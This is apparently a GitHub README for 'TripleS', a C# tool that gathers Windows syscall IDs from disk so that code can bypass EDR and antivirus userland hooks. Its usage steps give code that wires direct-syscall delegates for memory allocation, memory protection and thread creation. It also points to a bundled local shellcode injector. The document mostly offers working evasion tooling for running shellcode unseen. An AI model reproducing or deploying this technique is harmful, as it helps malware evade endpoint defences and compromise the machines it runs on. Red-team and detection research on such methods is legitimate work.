# TripleS - Extracting Syscall Stub, Modernized
TripleS or 3S is short for Syscall Stub Stealer. It freshly "steal" syscall stub straight from the disk. You can use TripleS for evading userland hooks from EDRs/AVs. TripleS doesnt invoke any unmanaged API, its all .NET's managed function. I should rename this program tho, since it doesnt use stubs anymore (v4), instead, it only collects syscall IDs.

## Usage
1. Create a new instance of TripleS
```
TripleS syscallstealer = new TripleS();
```
2. Prepare gate space
```
bool result = syscallstealer.PrepareGateSpace();
if (!result) {
    Console.WriteLine("Failed to prepare gate space!");
    return;
}
```
3. Collect all the syscalls
```
syscallstealer.CollectAllSyscalls(); // the syscall informations will be stored on the TripleS object
if (!syscallstealer.IsSyscallReady) {
    Console.WriteLine("Failed to collect syscall!");
    return;
}
```
4. Initialize the delegates
```
NTAVMDelegate NTAVM = (NTAVMDelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTAVMDelegate));
NTCTEDelegate NTCTE = (NTCTEDelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTCTEDelegate));
NTPVMDelegate NTPVM = (NTPVMDelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTPVMDelegate));
NTWFSODelegate NTWFSO = (NTWFSODelegate)Marshal.GetDelegateForFunctionPointer(syscallstealer.GatePositionAddress, typeof(NTWFSODelegate));
```
5. Use it!
```
IntPtr ProcessHandle = new IntPtr(-1); // pseudo-handle for current process
IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
IntPtr AllocationAddress = new IntPtr();
IntPtr ZeroBitsThatZero = IntPtr.Zero;
UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
Console.WriteLine("[*] Allocating memory...");
syscallstealer.Gate(NTAVMHash); // dont forget to set the gate to your destination function ;)
NTAVM(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
```
If you still confused, you can take a look at `Main` function from `UsageExample` class, its a local shellcode injector function with TripleS implemented. This code uses C# 5, so it can be compiled with the built-in CSC from Windows 10. 

## Note
- If you want to copy the code,Please dont forget to credit me.
- Github doesn't like my Sublime Text indentation settings, so if you see some "weirdness" on the indentation, Im sorry.
